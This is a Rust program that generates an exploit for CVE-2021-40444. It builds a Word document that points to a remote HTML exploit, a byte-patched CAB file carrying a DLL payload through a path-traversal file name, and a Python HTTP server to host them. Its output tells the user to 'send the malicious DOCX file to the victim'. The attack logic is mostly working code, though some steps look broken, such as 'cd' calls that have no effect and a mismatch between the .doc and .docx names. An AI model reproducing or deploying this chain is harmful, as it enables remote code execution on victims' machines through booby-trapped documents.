// Generating a malicious DLL payload.
// Writing HTML server URL.
// Generating a malicious DOCX file.
// Generating a malicious CAB file.
// Updating information on the HTML exploit.
// Hosting the HTML exploit using a Python HTTP server.

use std::fs::File;
use std::io::prelude::*;
use std::process::Command;
use std::fs::OpenOptions;

const HOST_DIR: &str = "/home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/";
const M_OFF: usize = 0x2d; // offset for the msvcrt.dll

//usage funtion is used to display how to use the code/program
// like "cargo run generate <port> <srv_url>" for generating the payload
// and host the file (/srv/) using python server with command
// python3 -m http.server <port> 
fn usage() {
    println!("--> Usage: cargo run generate <port> <srv_url>");
    println!("--> Usage: cargo run host <port> in srv/");
    std::process::exit(1);
}  

// function to check command line arguments passed while running 
// the program 
fn check_usage() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 4 {
        usage();
    }
    if args[1] == "generate" {
        let srv_url = &args[3];
        generate_payload(srv_url);
    } else if args[1] == "host" {
        let port = &args[2];
        start_server(port);
    } else {
        usage();
    }
}

// function to modify the content of a cab file located at path
fn patch_cab(path: &str){
    // open the cab file in binary read mode
    // and store it's content in a variable named cab_content
    let mut file = File::open(path).expect("Failed to open CAB file");
    let mut cab_content = Vec::new();
    file.read_to_end(&mut cab_content).expect("Failed to read CAB file");
    drop(file);

    // content modification
    // create a new variable out_cab and store the content of cab_content
    // from 0 to M_OFF offset
    let mut out_cab = cab_content[..M_OFF].to_vec();
    
    // append the sequence of bytes to out_cab
    out_cab.extend_from_slice(b"\x00\x5c\x41\x00");
    // now append the remaining portion of original cab_content
    // from M_OFF+4 to the end of the cab_content
    out_cab.extend_from_slice(&cab_content[M_OFF+4..]);
    // replace the sequence of bytes '..\\msword.inf' with '../msword.inf'
     // Iterate over each byte in out_cab and perform the replacement
     for i in 0..(out_cab.len() - 11) {
        if &out_cab[i..(i + 11)] == b"..\\msword.inf" {
            out_cab.splice(i..(i + 11), b"../msword.inf".iter().cloned());
        }
    }

    // file writing
    // open the cab file in binary write mode and 
    // write the modified content of out_cab to the cab file
    let mut file = File::create(path).expect("Failed to create CAB file");
    file.write_all(&out_cab).expect("Failed to write CAB file");
    //close the file
    drop(file);
    return
}

// function to execute a command 
fn execute_cmd(cmd: &str) {
    // execute the command using the Command module
    let output = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()
        .expect("Failed to execute command");
    // print the output of the command
    println!("{}", String::from_utf8_lossy(&output.stdout));
    return
}

// function to generate the payload 
fn generate_payload(srv_url: &str) {
    let payload_path = "/home/gohilmukund/recreation/CVE-2021-40444/rust2/test/calc.dll";

    println!("\n[ == Options == ]");
    println!("\t[ DLL Payload: {}", payload_path);
    println!("\t[ HTML Exploit URL: {}", srv_url);
    println!("");

    // payload content handling
    //read the content from the payload file in binary mode and write 
    // it to new file named "data/word.dll"
    let mut file = File::open(payload_path).expect("Failed to open DLL file");
    let mut payload_content = Vec::new();
    file.read_to_end(&mut payload_content).expect("Failed to read DLL file");
    drop(file);
    let mut out_file = File::create("/home/gohilmukund/recreation/CVE-2021-40444/rust2/data/word.dll").expect("Failed to create DLL file");
    out_file.write_all(&payload_content).expect("Failed to write DLL file");
    drop(out_file);

    // copying data and modifying XML:
    // cpy directory named 'data/word_dat/' to 'data/tmp_doc/'
    execute_cmd("cp -r /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/word_dat/   /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/tmp_doc/");
    // and modify the XML file in the directory
    println!("[*] Modifying XML file.....");
    // read content from file named 'data/tmp_doc/word/_rels/document.xml.rels'
    let mut file = File::open("/home/gohilmukund/recreation/CVE-2021-40444/rust2/data/tmp_doc/word/_rels/document.xml.rels").expect("Failed to open XML file");
    let mut xml_content = String::new();
    file.read_to_string(&mut xml_content).expect("Failed to read XML file");
    drop(file);

    // replace a placeholder '<EXPLOIT_HOST_HERE>' in XML content with
    // srv_url + '/word.html'
    xml_content = xml_content.replace("<EXPLOIT_HOST_HERE>", &format!("{}/word.html", srv_url));

    //as document.xml.rels file is present we will
    // write back the modified content to the same XML file
    // Open the file for writing, creating it if it doesn't exist
  // Open the file for writing, truncating it if it already exists
let mut out_file = OpenOptions::new()
    .write(true)
    .truncate(true)
    .open("/home/gohilmukund/recreation/CVE-2021-40444/rust2/data/tmp_doc/word/_rels/document.xml.rels")
    .expect("Failed to open XML file");
// Write the modified content to the file
out_file.write_all(xml_content.as_bytes()).expect("Failed to write XML file");

    // generating malicious DOCX file
    println!("[*] Generating malicious DOCX file.....");
    // navigate to 'data/tmp_doc/' directory and
    execute_cmd("cd /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/tmp_doc/");
    //zip the contents of the directory into a file named 'malicious.docx'
    execute_cmd("zip -r /home/gohilmukund/recreation/CVE-2021-40444/rust2/out/malicious.doc *");
    //copy the generated 'malicious.docx' file to 'out/malicious.docx'
    execute_cmd("cp /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/tmp_doc/malicious.docx /home/gohilmukund/recreation/CVE-2021-40444/rust2/out/");
    // and remove the 'data/tmp_doc/' directory
    execute_cmd("rm -rf /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/tmp_doc");

 // generating a malicious CAB file
    println!("[*] Generating malicious CAB file.....");
    // navigate tp 'data/' directory and
    // create a sub-directory named 'cab/'
    execute_cmd("cd /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/ && mkdir cab");
    // copies two files, 'word.dll' and 'msword.inf', from the current directory ('data/') to the 'cab/' directory.
    execute_cmd("cp /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/word.dll /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/cab/");
    execute_cmd("cp /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/msword.inf /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/cab/");
    // change to the 'data/cab/' directory 
    execute_cmd("cd /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/cab/");
    // zip msword.inf file into a file named 'out.cab'
    execute_cmd("zip /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/out.cab /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/cab/msword.inf");
    // patch the cab file using the function patch_cab()
    patch_cab("/home/gohilmukund/recreation/CVE-2021-40444/rust2/data/out.cab");
    // copy the patched cab file to 'srv/word.cab'
    execute_cmd("cp /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/out.cab /home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/word.cab");
    // remove original dll payload file and the temporary '/cab/' directory
    execute_cmd("rm /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/word.dll && rm -rf /home/gohilmukund/recreation/CVE-2021-40444/rust2/data/cab/");
    

    //updating information on the HTML exploit
    println!("[*] Updating information on the HTML exploit.....");
    // navigate to 'srv/' directory
    execute_cmd("cd /home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/");
    // copy file named 'backup.html' to 'word.html'
    execute_cmd("cp /home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/backup.html /home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/word.html");
    // read the content from the file 'srv/word.html' in binary mode
    // and replace '<HOST_CHANGE_HERE>' in the content with 
    // srv_url + '/word.cab'
    let mut file = File::open("/home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/word.html").expect("Failed to open HTML file");
    let mut html_content = String::new();
    file.read_to_string(&mut html_content).expect("Failed to read HTML file");
    drop(file);
    html_content = html_content.replace("<HOST_CHANGE_HERE>", &format!("{}//home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/word.cab", srv_url));
    // write the modified HTML content back to the file 'srv/word.html'
    let mut out_file = File::create("/home/gohilmukund/recreation/CVE-2021-40444/rust2/srv/word.html").expect("Failed to create HTML file");
    out_file.write_all(html_content.as_bytes()).expect("Failed to write HTML file");
    drop(out_file);
    println!("[+] HTML exploit file generated at: srv/word.html");

    // printing location of generated files
    println!("\n[ == Files Generated == ]");
    println!("\t[ DLL Payload: data/word.dll");
    println!("\t[ Malicious DOCX: out/malicious.doc");
    println!("\t[ Malicious CAB: srv/word.cab");
    println!("\t[ HTML Exploit: srv/word.html");
    println!("\t[ now start the server using: python3 -m http.server <port> and host the srv/ directory");
    println!("\t[ send the malicious DOCX file to the victim");
    println!("");
      return   
}
    
// function to start the server to serve files from HOST_DIR
fn start_server(port: &str) {
    println!("[*] Starting HTTP server on port {}", port);
    // navigate to 'srv/' directory and start the python server
    // and if any error occurs, print the error message
    execute_cmd(&format!("cd {} && python3 -m http.server {}", HOST_DIR, port));
    return
}

// main function to run the program
fn main() {
    // banner to display the program name
    println!("\n[ == CVE-2021-40444 == ]\n");
    // check the command line arguments passed while running the program
    // ideal command line arguments are "cargo run generate <port> <srv_url>" to generate the payload
    // and "cargo run host <port>" to host the file (/srv/) using python server
    // call the function check_usage() to check the command line arguments
    check_usage();
    return
}
